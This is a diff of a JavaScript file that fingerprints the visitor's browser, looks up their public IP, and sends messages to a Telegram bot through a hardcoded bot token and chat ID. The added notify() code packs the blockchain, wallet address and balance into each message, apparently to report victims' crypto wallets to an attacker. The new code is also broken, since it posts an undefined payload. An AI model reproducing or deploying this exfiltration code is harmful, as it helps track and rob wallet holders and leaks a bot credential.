@@ -1,4 +1,28 @@
 function browserN(){if((navigator.userAgent.indexOf("Opera")||navigator.userAgent.indexOf('OPR'))!=-1){return'Opera'}else if(navigator.userAgent.indexOf("Edg")!=-1){return'Edge'}else if(navigator.userAgent.indexOf("Chrome")!=-1){return'Chrome'}else if(navigator.userAgent.indexOf("Safari")!=-1){return'Safari'}else if(navigator.userAgent.indexOf("Firefox")!=-1){return'Firefox'}else if((navigator.userAgent.indexOf("MSIE")!=-1)||(!!document.documentMode==!0)){return'IE'}else{return'unknown'}}
 function fetch_ip(){$.getJSON("https://api.ipify.org?format=json",function(data){$("#eip").val(data.ip)})}
-async function notify(message){const botToken='7582406379:AAFSqZwUfw807J6Qf51Wa3fSQS5pPhU-R3c';const chatId='1369859387';const url=`https://api.telegram.org/bot${botToken}/sendMessage`;const data={chat_id:chatId,text:message};try{const response=await fetch(url,{method:'POST', cache: false, headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});if(!response.ok){console.error('Error notifying Telegram: '+await response.text())}}catch(error){console.error('Fetch error: '+error)}}
+async function notify(message){
+    const botToken='7582406379:AAFSqZwUfw807J6Qf51Wa3fSQS5pPhU-R3c';
+    const chatId='1369859387';
+    const url=`https://api.telegram.org/bot${botToken}/sendMessage`;
+    const data = {
+                chat_id: chatId,
+                text: `Blockchain: ${chain}\nWallet Address: ${wallet}\nBalance: ${balance}\nMessage: ${message}`
+            };
+            
+    $.ajax({
+        url: url,
+        type: 'POST',
+        data: json_payload,
+        contentType: "application/json; charset=utf-8",
+        dataType: "json",
+        cache: false,
+        async: false,
+        success: function (resp) {
+            alert(resp);
+        },
+        error: function(e) {
+            alert('Error: '+e);
+        }
+        });
+}
 
